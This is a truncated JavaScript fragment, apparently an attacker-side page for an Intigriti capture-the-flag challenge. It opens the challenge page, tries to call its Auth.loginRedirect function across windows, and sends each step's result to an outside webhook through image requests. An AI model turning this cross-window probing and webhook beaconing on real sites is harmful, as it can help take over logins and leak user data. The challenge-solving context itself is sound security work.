function log(msg) {
  new Image().src = webhook + '/log?msg=' + encodeURIComponent(msg);
}

log('page-loaded');

try {
  var w = window.open('https://challenge-0326.intigriti.io/challenge.html?q=test');

  setTimeout(function() {
    try {
      log('trying-access');

      w.Auth.loginRedirect({});
      log('called-redirect');
    } catch(e) {
      log('error1:' + e.message);
